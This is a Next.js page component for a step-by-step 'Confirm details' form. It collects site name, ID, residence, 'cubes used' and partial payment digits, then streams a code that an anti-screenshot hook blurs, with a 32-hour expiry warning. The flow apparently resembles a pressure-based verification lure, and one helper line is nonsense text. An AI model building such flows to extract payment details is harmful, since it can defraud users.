'use client';
export const dynamic = 'force-dynamic';

import React, { useEffect, useRef, useState } from 'react';
import Image from 'next/image';
import UserTopBar from '@/components/UserTopBar';
import useAntiScreenshot from '@/components/useAntiScreenshot';

const OPTIONS = ['кокз 1','кокз 2','кокз 3','кокоз 4','кокоз 5','кокоз 6','кокоз 7','кокоз 8','кокоз 9','кокоз 10','кокоз 11'];

type Profile = { nameOnSite?:string; idOnSite?:string; residence?:string; photoUrl?:string };
type Me = { id:number; role:'USER'|'ADMIN'; profile?:Profile; codeConfig?:{ lastStep?: number } };

export default function ConfirmPage(){
  const [step,setStep]=useState<number>(1);
  const [profile,setProfile]=useState<Profile|undefined>(undefined);

  const [site,setSite]=useState<string>('');
  const [nameOnSite,setName]=useState('');
  const [idOnSite,setId]=useState('');
  const [residence,setRes]=useState('');
  const [matches,setMatches]=useState<boolean|null>(null);

  const [cubes,setCubes]=useState<number|''>('');
  const [method,setMethod]=useState('');
  const [codeChars,setCodeChars]=useState<string>('');
  const [paused,setPaused]=useState(false);
  const [showPauseNote,setShowPauseNote]=useState(false);
  const evtRef = useRef<EventSource|null>(null);

  const blurred = useAntiScreenshot(6000);

  useEffect(()=>{
    (async()=>{
      const r = await fetch('/api/me',{cache:'no-store'}).then(x=>x.json()).catch(()=>null);
      const u = r?.user as Me | undefined;
      if(!u){ window.location.href = '/login'; return; }
      if(u.role === 'ADMIN'){ window.location.href = '/admin'; return; }
      setProfile(u.profile || {});
      const started = localStorage.getItem('code_started')==='1';
      const lastStep = u?.codeConfig?.lastStep || 1;
      const saved = localStorage.getItem('code_chars')||'';
      if(started || lastStep >= 6){
        setStep(6);
        setCodeChars(saved);
        setPaused(true);
        setShowPauseNote(true);
      }
    })();
    return ()=>{ if(evtRef.current) evtRef.current.close(); };
  },[]);

  useEffect(()=>{
    function onVis(){ if(document.visibilityState!=='visible'){ setPaused(true); setShowPauseNote(true);} }
    document.addEventListener('visibilitychange', onVis);
    return ()=>document.removeEventListener('visibilitychange', onVis);
  },[]);

  function startStream(){
    if(evtRef.current) evtRef.current.close();
    const es = new EventSource('/api/code-stream');
    evtRef.current = es;
    es.onmessage = (e)=>{
      try{
        const data = JSON.parse(e.data);
        if(data.type==='char' && !paused){
          setCodeChars(prev=>{
            const next = prev + data.value;
            localStorage.setItem('code_chars', next);
            return next;
          });
        }
      }catch{}
    };
    localStorage.setItem('code_started','1');
  }
  function doPause(){ setPaused(true); setShowPauseNote(true); }
  function doStart(){ setPaused(false); setShowPauseNote(false); }

  async function checkMatch(){
    const ok = (profile?.idOnSite||'').trim() === idOnSite.trim();
    setMatches(ok);
    setStep(3);
  }

  const Card = ({children}:{children:React.ReactNode}) => (
    <div style={{
      width:820, maxWidth:'92vw',
      background:'rgba(17,24,39,0.86)', border:'1px solid #1f2937',
      borderRadius:16, padding:18, color:'#e5e7eb',
      boxShadow:'0 16px 40px rgba(0,0,0,.45)'
    }}>{children}</div>
  );
  const Helper = ({children}:{children:React.ReactNode}) => (
    <div style={{fontSize:12, color:'#94a3b8', marginTop:2}}>{children}</div>
  );

  return (
    <div style={{
      minHeight:'100vh',
      display:'grid',
      gridTemplateRows:'auto 1fr auto',
      gap:16,
      backgroundImage:'url(/images/Background_1.webp)',
      backgroundSize:'cover',
      backgroundPosition:'center'
    }}>
      <UserTopBar />

      <div style={{display:'grid', placeItems:'center', padding:'28px 12px'}}>
        <Card>
          <div style={{fontSize:20, fontWeight:800, marginBottom:12, textAlign:'center'}}>Confirm details</div>

          {step===1 && (
            <div style={{display:'grid', gap:10}}>
              <label>The name of the website where you communicated and conducted transactions</label>
              <select className="input" value={site} onChange={e=>setSite(e.target.value)}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}}>
                <option value="">Select...</option>
                {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
              </select>
              <Helper>Если вы не нашли подходящий вариант обратитесь в поддержку.</Helper>
              <div style={{display:'flex', gap:10, marginTop:6, flexWrap:'wrap'}}>
                <a className="btn" href="/chat" style={{border:'1px solid #38bdf8', color:'#38bdf8', borderRadius:10, padding:'10px'}}>Open support chat</a>
                <button className="btn" disabled={!site}
                        onClick={()=>setStep(2)}
                        style={{border:'1px solid #22c55e', color:'#22c55e', borderRadius:10, padding:'10px'}}>Next</button>
              </div>
            </div>
          )}

          {step===2 && (
            <div style={{display:'grid', gap:12}}>
              <div>
                <label>Your name on the website</label>
                <input className="input" value={nameOnSite} onChange={e=>setName(e.target.value)} placeholder="John"
                       style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937',
                               color:'#e5e7eb', borderRadius:10, padding:'12px'}} />
              </div>
              <div>
                <label>Your ID on the website</label>
                <input className="input" value={idOnSite} onChange={e=>setId(e.target.value)} placeholder="ID12345"
                       style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937',
                               color:'#e5e7eb', borderRadius:10, padding:'12px'}} />
              </div>
              <div>
                <label>Place of residence indicated on the website</label>
                <input className="input" value={residence} onChange={e=>setRes(e.target.value)} placeholder="City, Country"
                       style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937',
                               color:'#e5e7eb', borderRadius:10, padding:'12px'}} />
              </div>

              <Helper>The panda rabbit crocodile, di di di, eats candy...</Helper>

              <div style={{display:'flex', gap:10, marginTop:2, flexWrap:'wrap'}}>
                <a className="btn" href="/chat" style={{border:'1px solid #38bdf8', color:'#38bdf8', borderRadius:10, padding:'10px'}}>Open support chat</a>
                <button className="btn" onClick={checkMatch}
                        style={{border:'1px solid #22c55e', color:'#22c55e', borderRadius:10, padding:'10px'}}>Confirm and continue</button>
              </div>
            </div>
          )}

          {step===3 && (
            <div style={{display:'grid', gap:12}}>
              {matches ? (
                <div style={{display:'grid', gap:8}}>
                  <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:10}}>
                    <div><div style={{fontSize:12, color:'#94a3b8'}}>Your name on the website</div><div>{profile?.nameOnSite||'-'}</div></div>
                    <div><div style={{fontSize:12, color:'#94a3b8'}}>Your ID on the website</div><div>{profile?.idOnSite||'-'}</div></div>
                    <div><div style={{fontSize:12, color:'#94a3b8'}}>Place of residence indicated on the website</div><div>{profile?.residence||'-'}</div></div>
                    <div>
                      {profile?.photoUrl ? (
                        <img src={profile.photoUrl} alt="photo"
                             style={{ width:140, height:140, borderRadius:'50%', objectFit:'cover',
                                      border:'2px solid #334155', boxShadow:'0 8px 16px rgba(0,0,0,.35)' }} />
                      ) : <div style={{color:'#94a3b8'}}>No photo</div>}
                    </div>
                  </div>
                  <button className="btn" onClick={()=>setStep(4)}
                          style={{width:'fit-content', border:'1px solid #22c55e', color:'#22c55e', borderRadius:10, padding:'10px'}}>Confirm and continue</button>
                </div>
              ) : (
                <div>
                  <div style={{background:'#1f2937', border:'1px solid #334155', color:'#e5e7eb', padding:10, borderRadius:10}}>
                    The entered data does not match. Please contact support.
                  </div>
                  <div style={{marginTop:8}}><a className="btn" href="/chat" style={{border:'1px solid #38bdf8', color:'#38bdf8', borderRadius:10, padding:'10px'}}>Open support chat</a></div>
                </div>
              )}
            </div>
          )}

          {step===4 && (
            <div style={{display:'grid', gap:8}}>
              <label>How many cubes did you use?</label>
              <input className="input" type="number" value={cubes}
                     onChange={e=>setCubes(e.target.value===''? '': parseInt(e.target.value||'0'))}
                     style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb',
                             borderRadius:10, padding:'12px'}} />
              <div style={{fontSize:12, color:'#94a3b8'}}>*please indicate the approximate quantity</div>
              <div><button className="btn" onClick={()=>setStep(5)} style={{border:'1px solid #22c55e', color:'#22c55e', borderRadius:10, padding:'10px'}}>Next</button></div>
            </div>
          )}

          {step===5 && (
            <div style={{display:'grid', gap:8}}>
              <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
              <input className="input" placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)}
                     style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb',
                             borderRadius:10, padding:'12px'}} />
              <div><button className="btn" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)}
                           style={{border:'1px solid #22c55e', color:'#22c55e', borderRadius:10, padding:'10px'}}>Next</button></div>
            </div>
          )}

          {step===6 && (
            <div style={{display:'grid', gap:10}}>
              <div style={{display:'flex', gap:8, flexWrap:'wrap'}}>
                <button className="btn" onClick={startStream} style={{border:'1px solid #38bdf8', color:'#38bdf8', borderRadius:10, padding:'10px'}}>Generate code</button>
                <button className="btn" onClick={doPause} style={{borderRadius:10, padding:'10px'}}>Pause</button>
                <button className="btn" onClick={doStart} style={{borderRadius:10, padding:'10px'}}>Start</button>
              </div>
              <div style={{
                whiteSpace:'pre-wrap', background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb',
                borderRadius:10, padding:'12px', minHeight:120,
                filter: blurred ? 'blur(10px)' : 'none', transition:'filter .3s ease',
                letterSpacing:3, textAlign:'center'
              }}>
                {(codeChars || 'Waiting for code...').split('').join(' ')}
              </div>
              {showPauseNote && (
                <div style={{background:'#fffbeb', border:'1px solid #fcd34d', color:'#1f2937', borderRadius:10, padding:10}}>
                  The pause is set for a maximum of 32 hours, after which the code will become invalid
                </div>
              )}
            </div>
          )}
        </Card>
      </div>

      <div style={{display:'grid', placeItems:'center', paddingBottom:14}}>
        <Image
          src="/images/Logo_3.webp"
          alt="logo"
          width={520}
          height={520}
          style={{ width:'min(82vw,520px)', height:'auto' }}
          priority
        />
      </div>
    </div>
  );
}
